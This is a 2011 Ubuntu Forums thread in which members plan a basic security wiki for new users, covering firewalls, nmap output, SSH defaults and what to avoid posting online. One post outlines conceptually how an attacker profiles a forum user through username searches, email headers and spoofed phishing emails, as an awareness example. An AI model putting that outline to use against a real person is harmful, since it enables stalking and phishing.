SF:4\.20,\x20UPnP/1\.0,\x20Portable\x20SDK\x20for\x20UPnP\x20devices/1\.6\
SF:.0\r\nCONTENT-LENGTH:\x2050\r\nCONTENT-TYPE:\x20text/html\r\n\r\n<html>
SF:<body><h1>400\x20Bad\x20Request</h1></body></html>");

---

### Post by haqking on 2011-11-04
To everyone posting results of network/machine configurations/nmap scans etc.

another tip for Newbies to security is not to post such outputs on public forums ;-)

Dont get into that practice.

---

### Post by MrLeek on 2011-11-04
The other two both say the same thing:

upnp    Portable SDK for UPnP devices 1.6.0 (kernel 2.4.20; UPnP 1.0)

Turned off upnp this morning on my router. I need to do some other stuff with it anyway (like update the firmware) so I'll probably just go nuclear, reset it and flash it (bringing in all the tips that I've picked up which will form part of the FAQs)

---

### Post by MrLeek on 2011-11-04
...and I still can't edit the wiki page that we're hoping to make!!! :confused:

---

### Post by Dangertux on 2011-11-04
> **haqking said:**
> To everyone posting results of network/machine configurations/nmap scans etc.

another tip for Newbies to security is not to post such outputs on public forums ;-)

Dont get into that practice.


+1 your nmap results are between you and the deity of your choice.

That being said nmap has a ton of options for security auditing. If you're interested in learning about securing your network I highly encourage you to explore them more deeply. Particularly the nmap scripting engine which can be made to audit everything up to and including the bio-efficiency of your toilet bowl.

---

### Post by haqking on 2011-11-04
> **MrLeek said:**
> ...and I still can't edit the wiki page that we're hoping to make!!! :confused:

editing is working fine.

Are you logging into it with your single sign on ?

---

### Post by MrLeek on 2011-11-04
> **haqking said:**
> editing is working fine.

Are you logging into it with your single sign on ?

Far as I can tell I'm logged in ok. The "more options" menu doesn't give anything that says "edit" (some are greyed out)...and when I try to go to the edit page via the address bar I get told that I'm not allowed to edit.

---

### Post by MrLeek on 2011-11-04
> **haqking said:**
> 

another tip for Newbies to security is not to post such outputs on public forums ;-)



Was thinking of this as i was posting it so I changed a few things (that wasn't my router make/model for example). Still can't translate the big question though - once I get some quick guidance I'll do some more editing (yea, google cache sucks!)

---

### Post by haqking on 2011-11-04
> **MrLeek said:**
> Far as I can tell I'm logged in ok. The "more options" menu doesn't give anything that says "edit" (some are greyed out)...and when I try to go to the edit page via the address bar I get told that I'm not allowed to edit.

so you go to the wiki, you see immutable page in top left, so you choose login on the right next to help.

Provide your SSO details and it still says immutable page ?

---

### Post by Ms. Daisy on 2011-11-04
> **MrLeek said:**
> Was thinking of this as i was posting it so I changed a few things (that wasn't my router make/model for example). Still can't translate the big question though - once I get some quick guidance I'll do some more editing (yea, google cache sucks!) Actually, someone on page 1 or 2 of this epic thread mentioned that it would be nifty to know what information to NOT share about your Ubuntu machine.  I used that suggestion & created a "Social Engineering" section, and I'd like to create a quick list of stuff you shouldn't do on your Ubuntu (like log into root) and what to never tell anyone.  That probably exists somewhere, so a link will work.  I'm keen to learn this category of things as I'm clueless at the moment.
 
To anyone interested in helping out, you can check out the evolving Wiki here:
[https://wiki.ubuntu.com/BasicSecurity](https://wiki.ubuntu.com/BasicSecurity)
 
A lot of you in this thread will recognize your suggestions.

---

### Post by CharlesA on 2011-11-04
> **Ms. Daisy said:**
> Actually, someone on page 1 or 2 of this epic thread mentioned that it would be nifty to know what information to NOT share about your Ubuntu machine.  I used that suggestion & created a "Social Engineering" section, and I'd like to create a quick list of stuff you shouldn't do on your Ubuntu (like log into root) and what to never tell anyone.  That probably exists somewhere, so a link will work.  I'm keen to learn this category of things as I'm clueless at the moment.
 
To anyone interested in helping out, you can check out the evolving Wiki here:
[https://wiki.ubuntu.com/BasicSecurity](https://wiki.ubuntu.com/BasicSecurity)
 
A lot of you in this thread will recognize your suggestions.

Nice wiki page so far.

I would suggest expanding some of the acronyms, such as uPNP and WPM (Wifi Protected Setup).

As a sidenote, I had to google "WPM" and it spit back WPS, which I think is the correct term, but I could be wrong.

---

### Post by haqking on 2011-11-04
> **Ms. Daisy said:**
> Actually, someone on page 1 or 2 of this epic thread mentioned that it would be nifty to know what information to NOT share about your Ubuntu machine.  I used that suggestion & created a "Social Engineering" section, and I'd like to create a quick list of stuff you shouldn't do on your Ubuntu (like log into root) and what to never tell anyone.  That probably exists somewhere, so a link will work.  I'm keen to learn this category of things as I'm clueless at the moment.
 
To anyone interested in helping out, you can check out the evolving Wiki here:
[https://wiki.ubuntu.com/BasicSecurity](https://wiki.ubuntu.com/BasicSecurity)
 
A lot of you in this thread will recognize your suggestions.

My favourite quote on Social Engineering is from the the most famous social engineer of all time (arguably)

```
"There is no patch for stupidity" - Kevin Mitnick
```

Thats not meant derogatively to anyone in this thread either, it is a great example of what social engineering exploits.

A security flaw inherent in every system is its users/admins.

PEBKAP = Problem Exists Between Keyboard And Person

---

### Post by CharlesA on 2011-11-04
Yeah. That is a huge flaw but it's threat can be reduced or limited with training.

Good quote too.

---

### Post by MrLeek on 2011-11-04
> **haqking said:**
> My favourite quote on Social Engineering is from the the most famous social engineer of all time (arguably)

```
"There is no patch for stupidity" - Kevin Mitnick
```Thats not meant derogatively to anyone in this thread either, it is a great example of what social engineering exploits.

A security flaw inherent in every system is its users/admins.

PEBKAP = Problem Exists Between Keyboard And Person

...and that's what we're trying to do here. We can't eliminate stupid people (if only!) so they will click on links in phishing emails. What we can do is to try and fix the simple security things so if they can avoid being stupid on the net they've got half a chance of not getting burned.

---

### Post by MrLeek on 2011-11-04
> **haqking said:**
> so you go to the wiki, you see immutable page in top left, so you choose login on the right next to help.

Provide your SSO details and it still says immutable page ?

It used to yes....but now it's finally allowed me to edit stuff. 

Does this make a pro on the interweb thingy? :)

---

### Post by Dangertux on 2011-11-04
I was going to suggest, since you guys are so into this maybe it might be wise to collaborate with everyone who wants to work on this in say IRC or skype or something like that.

It would allow more realtime exchange of ideas and changes.

Just a thought.

---

### Post by haqking on 2011-11-04
> **MrLeek said:**
> It used to yes....but now it's finally allowed me to edit stuff. 

Does this make a pro on the interweb thingy? :)


cool, glad you got it sorted.

There is an interweb now ? I heard about that, never thought it would take off personally ;-)

DT has made some edits, i did some typo's.

I am refraining from actually placing material on there as it wont be in noob speak (as i dont think it can be, IMO) but i am happy to help anyways, will keep popping back to edit where i see fit in material added.

I know DT has been editing away this morning too.

Good luck

---

### Post by CharlesA on 2011-11-04
> **Dangertux said:**
> I was going to suggest, since you guys are so into this maybe it might be wise to collaborate with everyone who wants to work on this in say IRC or skype or something like that.

It would allow more realtime exchange of ideas and changes.

Just a thought.
That might be a good idea. You can use freenode for IRC.

---

### Post by haqking on 2011-11-04
I mentioned in briefly in [http://ubuntuforums.org/showpost.php?p=11418599&postcount=38](http://ubuntuforums.org/showpost.php?p=11418599&postcount=38)

Yes IRC would be better for you guys, those unfamiliar with it can use the web interface at

[http://webchat.freenode.net/](http://webchat.freenode.net/)

---

### Post by WasMeHere on 2011-11-04
> **Ms. Daisy said:**
> ... 
To anyone interested in helping out, you can check out the evolving Wiki here:[U]
[https://wiki.ubuntu.com/BasicSecurity](https://wiki.ubuntu.com/BasicSecurity)[/U]
 
A lot of you in this thread will recognize your suggestions.

I think we are doing something great right now :KS

Having fun finding out
Olle

---

### Post by MrLeek on 2011-11-04
> **haqking said:**
> 
DT has made some edits, i did some typo's.

I am refraining from actually placing material on there as it wont be in noob speak (as i dont think it can be, IMO) but i am happy to help anyways, will keep popping back to edit where i see fit in material added.


Appreciate anyone's help. For stuff that's not in newbie/noob speak....to be honest that's not your job. Ms Daily, me, whoever else we volunteer for this.... our job is to try and put it in a place where newbies can apply that security setting. So if you think "these guys need to try and cover x" then drop some rapid text and a link or three and let the newbie squad figure it out!

Otherwise it's looking decent however we do need to watch out for a wall of text. No big deal now, but at some point we'll be creating a bunch of sub pages. Otherwise newbies will miss key info wading though the material.

---

### Post by MrLeek on 2011-11-04
Thinking about firewalls, there's two types (correct me if I'm wrong):

- Ubuntu firewall: use Danger's thread as a reference (and further info link); identify other useful links; explain in newbie speak how to set one up.

- NAT firewall: they have lots of options to tick/select. Which ones are good/bad?

If we kept this part fairly light, would that be sufficient to get newbies going?

---

### Post by WasMeHere on 2011-11-04
I tested the Wiki page and it was possible for me to log in via my launchpad account, and it seems that I can do editing. Right now I do not have time to do any time-consuming stuff, but I'll be around and help when possible.

Olle

---

### Post by haqking on 2011-11-04
> **MrLeek said:**
> Thinking about firewalls, there's two types (correct me if I'm wrong):

- Ubuntu firewall: use Danger's thread as a reference (and further info link); identify other useful links; explain in newbie speak how to set one up.

- NAT firewall: they have lots of options to tick/select. Which ones are good/bad?

If we kept this part fairly light, would that be sufficient to get newbies going?

The 2 types would be hardware and software (though most people dont type them as that, i do though, a hardware firewall is better defined as a dedicated i suppose, it is my own terminology to be honest, as hardware firewall still runs software)

And then it comes down to application layer, stateful, stateless etc.

NAT is not a type of firewall but a function of alot of firewalls (or more typically a function of the router upon which alot of firewalls reside, which is usually IPTables/Netfilter on most home routers anyways as they usually run some embedded Linux)

---

### Post by MrLeek on 2011-11-04
> **haqking said:**
> The 2 types would be hardware and software.

And then it comes down to application layer, stateful etc.

NAT is not a type of firewall but a function of alot of firewalls

Sorry I wasn't being clear in my thinking. I'm thinking here of the argument that "but i have a router" = I don't need a software firewall. It may be worth trying to dumb the argument down to that level to say "that's just part of the solution". 

Came across an old book (from Linux Format) the other day (had it for ages) and they make a big thing about using an old PC as a hardware firewall. Is that worth doing? Easy for newbies to do?

---

### Post by haqking on 2011-11-04
> **MrLeek said:**
> Sorry I wasn't being clear in my thinking. I'm thinking here of the argument that "but i have a router" = I don't need a software firewall. It may be worth trying to dumb the argument down to that level to say "that's just part of the solution". 

Came across an old book (from Linux Format) the other day (had it for ages) and they make a big thing about using an old PC as a hardware firewall. Is that worth doing? Easy for newbies to do?

well if you have a router (it is a hardware firewall (in my terms) but also software as it runs software)

I am probably confusing things here with the terms i myself use.  Hardware firewall really means a dedicated device for that purpose.

So if you have a router it is running software (probably IPTables) that acts as firewall.  This doesnt mean your desktop PC does not need a firewall (software) due to reverse connections and the like.

Layered approach is best

---

### Post by Dangertux on 2011-11-04
> **MrLeek said:**
> Thinking about firewalls, there's two types (correct me if I'm wrong):

- Ubuntu firewall: use Danger's thread as a reference (and further info link); identify other useful links; explain in newbie speak how to set one up.

- NAT firewall: they have lots of options to tick/select. Which ones are good/bad?

If we kept this part fairly light, would that be sufficient to get newbies going?

Okay this went wrong somewhere lol...Ubuntu's firewall is netfilter/iptables. Ubuntu utilizes various front ends GUFW UFW etc etc. To control packet filtering at the kernel level via netfilter/iptables.

NAT - Network Address Translation is a function of a firewall that can be used to create a router. This in and of itself is NOT a firewall. 

In terms of firewalls you have hardware appliances and software based firewalls, although a hardware based firewall will be running some type of software firewall, so this is redundant.More specifically we can get into the followign

Stateless : Provides basic packet filtering based on things like source port destination port source address destination address and protocol

Stateful : Described I believe in that thread about firewalls. Long story short checks connection validity (not malicious intent)

Deep Packet Inspection : Looks for bad stuff in concurrent packet data, likened to intrusion prevention systems.

Then of course you have mandatory access controls and application firewalls (mod_security) which are a type of firewall, but not exactly the same thing, and should not be referred to as a "firewall" technically. Though if you think of the definition of a firewall (literal) and what these applications do it makes sense. 

This gets complicated quickly...

---

### Post by SparTacux on 2011-11-04
> **haqking said:**
> To everyone posting results of network/machine configurations/nmap scans etc.

another tip for Newbies to security is not to post such outputs on public forums ;-)

Dont get into that practice.

You wouldn't catch me doing such a thing ;-)

One could give false information though just to lead would be attackers up the garden path :-)

---

### Post by Ms. Daisy on 2011-11-04
> **SparTacux said:**
> You wouldn't catch me doing such a thing ;-)
 
One could give false information though just to lead would be attackers up the garden path :-)That's exactly what we're looking for.  A new user wouldn't know where to provide false info & where to provide true info in order to balance their protection with getting a useful answer on the forum.  If you have any guidance to offer on the subject, or maybe know of a link, it would be appreciated.
 
In general, does anyone know of links to such subject matter?  I'm not even sure what key words to use in a search for links.

---

### Post by Dangertux on 2011-11-04
> **Ms. Daisy said:**
> That's exactly what we're looking for.  A new user wouldn't know where to provide false info & where to provide true info in order to balance their protection with getting a useful answer on the forum.  If you have any guidance to offer on the subject, or maybe know of a link, it would be appreciated.
 
In general, does anyone know of links to such subject matter?  I'm not even sure what key words to use in a search for links.

Giving false information is taking you into the realm of things like honeypots and banner forgery. Probably not the best topic for beginning users. Unless you mean just posting information on a forum in which case just version your services and OS fingerprint anyway you want in the nmap scan results.

BTW I thought you had work to do? lol

---

### Post by haqking on 2011-11-04
> **Ms. Daisy said:**
> That's exactly what we're looking for.  A new user wouldn't know where to provide false info & where to provide true info in order to balance their protection with getting a useful answer on the forum.  If you have any guidance to offer on the subject, or maybe know of a link, it would be appreciated.
 
In general, does anyone know of links to such subject matter?  I'm not even sure what key words to use in a search for links.

That is one of the issues of where we said it is difficult to create a such a guide.

There is no simple answer to that.

Do you post your own configuration information ? no it is bad practice security wise.  What if someone asks me too to help troubleshoot, well do you trust them and if so how or why ?

What is information i shouldnt post ? depends on the problem in hand and whether it relates to security or a vulnerability.

There is no real list of what not to post and what to post, other than the obvious such as public IP addresses, NMAP type results and the such

---

### Post by CharlesA on 2011-11-04
> **haqking said:**
> That is one of the issues of where we said it is difficult to create a such a guide.

There is no simple answer to that.

Do you post your own configuration information ? no it is bad practice security wise.  What if someone asks me too to help troubleshoot, well do you trust them and if so how or why ?

What is information i shouldnt post ? depends on the problem in hand and whether it relates to security or a vulnerability.

There is no real list of what not to post and what to post, other than the obvious such as public IP addresses, NMAP type results and the such

Pretty much the whole thing here.

I know I've posted netstat, ifconfig and whatnot from my home server but nothing in it is "[Personally identifiable information]("http://en.wikipedia.org/wiki/Personally_identifiable_information")."

It might tell you what services I have running, but they don't include my public IP or how my network is set up.

---

### Post by MrLeek on 2011-11-04
> **CharlesA said:**
> 
I know I've posted netstat, ifconfig and whatnot from my home server but nothing in it is "[Personally identifiable information]("http://en.wikipedia.org/wiki/Personally_identifiable_information")."


I'm guessing that it's impossible to create a list of examples to try and explain that to newbies? Again, people will still make mistakes, but the more people understand what would be identifiable information and what is not then less mistakes are made and people can still ask questions.

---

### Post by CharlesA on 2011-11-04
> **MrLeek said:**
> I'm guessing that it's impossible to create a list of examples to try and explain that to newbies? Again, people will still make mistakes, but the more people understand what would be identifiable information and what is not then less mistakes are made and people can still ask questions.
You might be able to put a list together with some of the common stuff, but you can't really cover it all.

---

### Post by MrLeek on 2011-11-04
> **Dangertux said:**
> Okay this went wrong somewhere lol...Ubuntu's firewall is netfilter/iptables. Ubuntu utilizes various front ends GUFW UFW etc etc. To control packet filtering at the kernel level via netfilter/iptables.

NAT - Network Address Translation is a function of a firewall that can be used to create a router. This in and of itself is NOT a firewall. 

In terms of firewalls you have hardware appliances and software based firewalls, although a hardware based firewall will be running some type of software firewall, so this is redundant.

This was my point in the earlier post I made (after the one you quoted). I know that the "firewall" in my router is not a real firewall....but I'd be hard pressed to explain why that is. Moreover, I know that having a software firewall on each system accessing the net is a smart move.

The trick is to explain that to newbies in a way that they "get".

In fact I'll go further. It's ok to develop a newbie article that glosses over certain areas, misses out bits...and maybe even uses a teaching model that's just wrong to enable the reader to understand why having a firewall on each system (for example) is A Good Thing. The catch is for readers to understand that there's more to the subject - and people run random bits of code in a terminal window "because blog xxxxx told me to". We cannot factor in stupid people - so why try?

---

### Post by haqking on 2011-11-04
> **MrLeek said:**
> I'm guessing that it's impossible to create a list of examples to try and explain that to newbies? Again, people will still make mistakes, but the more people understand what would be identifiable information and what is not then less mistakes are made and people can still ask questions.

ok i will try to use some easy to understand examples (as examples they may be flawed as i am missing out some technical concepts)however as examples they work.

People often use usernames on here which are easily searched for on google (you would be surprised at personal information can be gleemed from a simple google search on a username)  Armed with the right technical know how and researching all the posters various posts.

Lets say for example.

userxxx posts on here, a quick google finds userxxx using a gardeners forum, football club fan page, facebook etc etc.  Tying certain facts together you can gleem who are the same userxxx as other posts, from this personal information we can now start to harvest possible password combinations.

OK now this all requires some technical knowledge to be able to utilise but it is not hard, we may have found out a email address, and in which lies the possibility of a login for this or another forum.

We might find say a IM handle (yahoo, msn, skype etc) so we now know the handles, and in which often lie email addresses.

What can we do with an email address ?

mmm send an email to them and hopefully get a response, what does that mean ? ever looked in a email header ?

sometimes the WAN IP address, not always and depends on setup obviously.

We could spoof the email to pretend to be someone from here, posting a link perhaps (you know what happens when you click on links right ;-)

Now we possibly have  the WAN IP address (or other useful information) possible usernames and password combos.  Along with router model and firmware information posted by the user on a Ubuntu Forum and some ports open information, nmap scan results

ad nauseum ad infinitum

This is not concise, not technically perfect and one example of hundreds of other methods.  All this i posted of course is easy and doesnt really require much info at all, other than that posted by the potential victim of an attack.

Now i used this example to abstract the complex and keep it in simple terms, it was all done using publicly available information and a little social engineering.

Edit: a good point was raised from DT about the email header thing, i did wander whether to use that as an example as it is very outdated, i was using it to prove the point. Like i said it is all conceptual for the point of the example about giving information away, im pretty sure a step by step on how to do something like this would impose a post removal ;-)

Hope this helps somewhat to prove a point

---

### Post by CharlesA on 2011-11-04
That's actually a pretty good write up, haqking.

---

### Post by haqking on 2011-11-04
> **CharlesA said:**
> That's actually a pretty good write up, haqking.

Thanks i was trying to post something that didnt contain any technical references yet pointed out some easy to grasp concepts of something that is relatively easy to do.

I am not too good with metaphors.

---

### Post by SparTacux on 2011-11-04
> **CharlesA said:**
> That's actually a pretty good write up, haqking.

Yeah - pretty impressive.
I'm going to go through your posts to see what you have given away ;-)

I'd better check my router logs to see who's trying to get in on the open ports I mentioned.

---

### Post by Dangertux on 2011-11-04
+1 haqking, good example :-)

---

### Post by WasMeHere on 2011-11-04
> **haqking said:**
> ...
Now i used this example to abstract the complex and keep it in simple terms, it was all done using publicly available information and a little social engineering.

+1
Most of us (noobs) need to be reminded about the risks with social media.

Olle

---

### Post by haqking on 2011-11-04
oh and as a disclaimer, i didnt bother to look if there was a bob123 on this forum...LOL

if there is then my apologies...HA HA

i think i will change that ;-)

---

### Post by haqking on 2011-11-04
> **SparTacux said:**
> Yeah - pretty impressive.
I'm going to go through your posts to see what you have given away ;-)

I'd better check my router logs to see who's trying to get in on the open ports I mentioned.

ha nothing that i am bothered about thats for sure ;-)

plus feel free to exploit any of my vulnerabilities, always interested to find them out, the only thing you will find about me on the interweb thingy is Ubuntu forums and omgcheesecake where they like to discuss UF and mention my posting style...LOL too much use of ;-) apparently. ;-)

---

### Post by WasMeHere on 2011-11-04
I just installed Ubuntu Server 10.04 LTS on a small partition on one of my computers. I remember from the very first post of this thread:
> **MrLeek said:**
> ...
Then you get a part that says:
> The two most common cracks posted on these forums are ssh and vnc, both running with password authentication.


And when I connect with ssh to the server without any tweaking at all, it uses password authentication. Convenient yes, but how should a newbie expect the Ubuntu mason to leave it like that, if it is not considered secure?

What should we do about this?
1. Tell newbies to stay away from server functions
2. Help newbies to change from password authentication
3. Ask those responsible for Ubuntu Server to change the default setting (would it make it too hard to get ssh running?)

Olle

---

### Post by Ms. Daisy on 2011-11-04
> **Olle Wiklund said:**
> I just installed Ubuntu Server 10.04 LTS on a small partition on one of my computers. I remember from the very first post of this thread:


And when I connect with ssh to the server without any tweaking at all, it uses password authentication. Convenient yes, but how should a newbie expect the Ubuntu mason to leave it like that, if it is not considered secure?

What should we do about this?
1. Tell newbies to stay away from server functions
2. Help newbies to change from password authentication
3. Ask those responsible for Ubuntu Server to change the default setting (would it make it too hard to get ssh running?)

OlleThat gets to the heart of the matter.  We're thinking that we will focus on desktop, non-server use.  We mention it and say that if you want to install a server then you need to do research and understand how to secure it.  Personally I don't see running a server as a "new user" concept, IMO it requires some technical knowledge and therefore is beyond the scope of the Wiki.  What the Wiki will focus on are non-server related security, which IMO has been muddled with server security in this forum (or maybe better put, as a new user I can't tell the difference between the two).

---

### Post by haqking on 2011-11-04
> **Ms. Daisy said:**
> That gets to the heart of the matter.  We're thinking that we will focus on desktop, non-server use.  We mention it and say that if you want to install a server then you need to do research and understand how to secure it.  Personally I don't see running a server as a "new user" concept, IMO it requires some technical knowledge and therefore is beyond the scope of the Wiki.  What the Wiki will focus on are non-server related security, which IMO has been muddled with server security in this forum (or maybe better put, as a new user I can't tell the difference between the two).

that is true.  However as far as securing a server goes, it is actually usually easier than a desktop.

A server is usually used for for a few certain services, and then just there doing its job.

Securing a desktop is alot more challenging due to multiple applications, services running at any given time, the user interaction, browsing internet (sometimes whilst logged in as root) etc etc

A server is usually a server hardly ever a desktop

A desktop is often both a desktop (client) and server in its roles and services installed and running

Remember that a server is not defined by the name server, or the OS server edition or the hardware.  If you have a desktop with a server service then server security applies usually

A server is more straight forward but more important, a desktop is likely to contain alot more granularity in its controls and varies so much from person to person (user to user) where as server can often be identical to to multiple other server due to its role.

---

### Post by MrLeek on 2011-11-04
> **SparTacux said:**
> I'm going to go through your posts to see what you have given away ;-)
I'd better check my router logs to see who's trying to get in on the open ports I mentioned.

> **haqking said:**
> ha nothing that i am bothered about thats for sure :wink:

plus feel free to exploit any of my vulnerabilities, always interested  to find them out.... 

Some scary stuff here! I'm still trying to interpret what was going on in the stuff back in post 87, let alone close it off!

---

### Post by Ms. Daisy on 2011-11-04
> **Dangertux said:**
> BTW I thought you had work to do? lol Yeah. FAIL.  :D

---

### Post by MrLeek on 2011-11-04
> **haqking said:**
> that is true.  However as far as securing a server goes, it is actually usually easier than a desktop.

A server is usually used for for a few certain services, and then just there doing its job.

Securing a desktop is alot more challenging due to multiple applications, services running at any given time, the user interaction, browsing internet (sometimes whilst logged in as root) etc etc

A server is usually a server hardly ever a desktop

A desktop is often both a desktop (client) and server in its roles and services installed and running

Remember that a server is not defined by the name server, or the OS server edition or the hardware.  If you have a desktop with a server service then server security applies usually

A server is more straight forward but more important, a desktop is likely to contain alot more granularity in its controls and varies so much from person to person (user to user) where as server can often be identical to to multiple other server due to its role.

All true. But if you look at it from a newbie perspective then telling them about configuring things as a server sounds difficult to do - and they're more likely to get it wrong if they try!

Maybe we can insert "server-style" security (whatever that means!) to get good security without confusing thing.

As for your non-technical description on finding out who a person is on the net - full marks. Once you're happy that you've made all the changes you need to that's probably getting lifted into the newbie guide! :)

---

### Post by haqking on 2011-11-04
> **MrLeek said:**
> All true. But if you look at it from a newbie perspective then telling them about configuring things as a server sounds difficult to do - and they're more likely to get it wrong if they try!

Maybe we can insert "server-style" security (whatever that means!) to get good security without confusing thing.

As for your non-technical description on finding out who a person is on the net - full marks. Once you're happy that you've made all the changes you need to that's probably getting lifted into the newbie guide! :)

yeah thats fine you can use it in the wiki, i may edit it once it is there ;-)

It was really not about finding out about someone per se, more a description of how using online presence information (easily gathered) a preparation for a potential attack can occur, especially if that online presence contains network configuration information and the like.

Glad it was helpful, it really was very basic and i tried to remove all complexity from it at the expense of making it sound too easy but to demonstrate a point and make people think about what and how they publish or post information.

cheers

---

### Post by MrLeek on 2011-11-04
out of interest, what happens if you run nmap [external IP address]? Good thing or bad thing to do? Trying to bottom out this weird internal port that was open that I can't understand....

If it's only internal then it's ok....i think?

---

### Post by Dangertux on 2011-11-04
> **MrLeek said:**
> out of interest, what happens if you run nmap [external IP address]? Good thing or bad thing to do? Trying to bottom out this weird internal port that was open that I can't understand....

If it's only internal then it's ok....i think?

If you run it from behind your router. It will give you an internal scan.

If you run it from outside your router, on the internet nmap is liable to discover life on other planets. Nah it will most likely tell you you don't have any ports open, maybe remote admin for your router if it's configured poorly or whatever ports you've forwarded.

Oh yeah...Don't scan stuff that doesn't belong to you. It makes sysadmins and ISP's nervous lol.

---

### Post by haqking on 2011-11-04
> **MrLeek said:**
> out of interest, what happens if you run nmap [external IP address]? Good thing or bad thing to do? Trying to bottom out this weird internal port that was open that I can't understand....

If it's only internal then it's ok....i think?

well there is a fine line between legal and illegal activities, especially when online.

As a regular user using such tools, they need to be aware that if doing things outside there own infastructure (external IP addresses) they may be contravening acceptable Use Policies of the ISP.

I would personally only ever condone the use of any such tools on internal addresses on your own infrastructure.

If you attempt to scan your own external IP you may find yourself  in trouble with your ISP (probably wont but thats not the point)

from an ethical point of view that is all i can recommend as advice IMO

I am probably being over cautious here how i advise, however i would refer you to [http://nmap.org/book/legal-issues.html](http://nmap.org/book/legal-issues.html)

---

### Post by MrLeek on 2011-11-04
Cheers both. Just trying to puzzle this one out; looks like it's part of a UPnP Portable SDK (reads like a bit of html). I found this:

> Portable SDK for UPnP Devices (libupnp 1.6.0), 1.6.0 or later       
The libupnp library is used for communication using the UPnP protocol. libupnp can be downloaded from [http://upnp.sourceforge.net/](http://upnp.sourceforge.net/). libupnp 1.6.0 and later can be downloaded from [http://pupnp.sourceforge.net/](http://pupnp.sourceforge.net/).       
Debian packages for libupnp are available in stable since the *Sarge* release. The runtime package is called libupnp0 (or libupnp2), and the package required when building is libupnp-dev.       


From there I found vlc-nox which was installed, which does media streaming from a network source (i.e. my unRAID box). So I need to consider if this is safe, but it's not something nasty going on....I hope!

---

### Post by SparTacux on 2011-11-04
> **Dangertux said:**
> If you run it from behind your router. It will give you an internal scan.

If you run it from outside your router, on the internet nmap is liable to discover life on other planets. Nah it will most likely tell you you don't have any ports open, maybe remote admin for your router if it's configured poorly or whatever ports you've forwarded.

Oh yeah...Don't scan stuff that doesn't belong to you. It makes sysadmins and ISP's nervous lol.

 You could also find yourself on the end of some retalitary action too. You might invite a hacking attempt on your own network since what you did is seen as an act of war in cyber space. ;-)

---

### Post by SparTacux on 2011-11-04
> **MrLeek said:**
> Some scary stuff here! I'm still trying to interpret what was going on in the stuff back in post 87, let alone close it off!

 Do a Google search on your router type and mention that port being open. I think you'll find other people have already come across it and you'll probably be given a satisfactory reason for it being there.

---

### Post by Dangertux on 2011-11-04
> **SparTacux said:**
> You could also find yourself on the end of some retalitary action too. You might invite a hacking attempt on your own network since what you did is seen as an act of war in cyber space. ;-)

That's just a tad bit dramatic.

---

### Post by SparTacux on 2011-11-04
> **Dangertux said:**
> That's just a tad bit dramatic.

 LOL - I'm a drama Queen

---

### Post by Ms. Daisy on 2011-11-04
> **haqking said:**
> Do you post your own configuration information ? no it is bad practice security wise. Let's focus on this statement from haqking.  What exactly do you mean by "configuration information?" Do you mean the exact specs of your computer & router? Do you mean the OS & security settings you have in place?  We can't hamstring new users by saying don't divulge anything at all.  Unless that's really your recommendation (in which case I need to delete like 80 forum posts I made).  And actually in my newbie eyes, that contradicts the recommendations of this forum, which is that the more information you give, the better the answer you will get. So that's what I want to clear up. 

IMO here's what we need to address in the Wiki: when I'm asking for help in the Ubuntu forum, I need to provide a certain amount of info about my system.  But I should avoid divulging too much information.  Can we give a tiny bit of guidance on that?  To help Jane Doe you probably need to know that she is running Kubuntu 11.04 on a desktop PC.  But maybe she shouldn't tell everyone that it's a [Compaq Presario CQ5700F PC (Black)]("http://www.amazon.com/Compaq-Presario-CQ5700F-PC-Black/dp/B004G5ZSW0/ref=sr_1_1?s=pc&ie=UTF8&qid=1320452448&sr=1-1") , IP address 15.64.98.189 connected to that interweb thingy via her [Wireless N Router - 802.11n - 150 Mbps - 2.4 Ghz - NEW Design w/ Internal Antenna]("http://www.amazon.com/Medialink-Wireless-802-11n-Internal-Antenna/dp/B0044YU60M/ref=sr_1_2?s=pc&ie=UTF8&qid=1320452312&sr=1-2")  , IP address 64.85.67.148 Do you see what I mean?  Surely there's a pragmatic approach that a clueless user can employ when asking for help.   I think that maybe it's so incredibly basic that the experts here take it as given knowledge.

As far as the social engineering goes, I have modified that section of the Wiki to specifically address social engineering AS IT RELATES TO UBUNTU.  Someone included a good link to social eng. in general, and I kept that in there as a recommended area of further research.  But I'm going to be vigilant in our effort to prevent restating information that can be found elsewhere.  In fact, what if we provide a link to haqking's excellent post summarizing social media concerns? Rather than try to include it within the Wiki, make it an external link.  I need feedback on that idea.

---

### Post by haqking on 2011-11-04
> **Ms. Daisy said:**
> Let's focus on this statement from haqking.  What exactly do you mean by "configuration information?" Do you mean the exact specs of your computer & router? Do you mean the OS & security settings you have in place?  We can't hamstring new users by saying don't divulge anything at all.  Unless that's really your recommendation (in which case I need to delete like 80 forum posts I made).  And actually in my newbie eyes, that contradicts the recommendations of this forum, which is that the more information you give, the better the answer you will get. So that's what I want to clear up. 

IMO here's what we need to address in the Wiki: when I'm asking for help in the Ubuntu forum, I need to provide a certain amount of info about my system.  But I should avoid divulging too much information.  Can we give a tiny bit of guidance on that?  To help Jane Doe you probably need to know that she is running Kubuntu 11.04 on a desktop PC.  But maybe she shouldn't tell everyone that it's a [Compaq Presario CQ5700F PC (Black)]("http://www.amazon.com/Compaq-Presario-CQ5700F-PC-Black/dp/B004G5ZSW0/ref=sr_1_1?s=pc&ie=UTF8&qid=1320452448&sr=1-1") , IP address 15.64.98.189 connected to that interweb thingy via her [Wireless N Router - 802.11n - 150 Mbps - 2.4 Ghz - NEW Design w/ Internal Antenna]("http://www.amazon.com/Medialink-Wireless-802-11n-Internal-Antenna/dp/B0044YU60M/ref=sr_1_2?s=pc&ie=UTF8&qid=1320452312&sr=1-2")  , IP address 64.85.67.148 Do you see what I mean?  Surely there's a pragmatic approach that a clueless user can employ when asking for help.   I think that maybe it's so incredibly basic that the experts here take it as given knowledge.

As far as the social engineering goes, I have modified that section of the Wiki to specifically address social engineering AS IT RELATES TO UBUNTU.  Someone included a good link to social eng. in general, and I kept that in there as a recommended area of further research.  But I'm going to be vigilant in our effort to prevent restating information that can be found elsewhere.  In fact, what if we provide a link to haqking's excellent post summarizing social media concerns? Rather than try to include it within the Wiki, make it an external link.  I need feedback on that idea.


Well thats the point i was making earlier about what to post and what not to post, it is very difficult to know especially for a noob.

The reason it is hard to know is that you need to understand the vulnerabilities that may exist in what you post, which if course if you did it is likely you wouldnt be posting anyways.

An example is, alot of people post nmap outputs and ask what the output means, is it good or bad ? well good or bad depends on your configuration, services, requirements etc.

nmap is useless unless you can interpret the output, a noob is not someone who can interpret nmap output.

